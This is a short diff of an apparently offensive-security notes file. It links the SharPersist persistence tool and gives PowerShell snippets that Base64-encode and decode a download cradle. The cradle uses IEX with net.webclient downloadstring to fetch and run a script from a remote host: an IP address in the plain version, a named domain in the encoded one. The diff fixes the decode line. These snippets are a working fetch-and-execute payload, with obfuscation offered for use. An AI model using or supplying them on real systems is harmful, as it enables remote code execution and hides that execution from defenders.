@@ -1,14 +1,14 @@
 ### SharPersist
 https://github.com/mandiant/SharPersist
 
-### Powershell Encoding
+### Powershell Encoding & Decoding
 ```powershell
 $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 ```powershell
 $Encoded="SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA"
-[System.Convert]::FromBase64String([System.Text.Encoding]::Unicode.GetString($Encoded))
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))
 
 ```
 
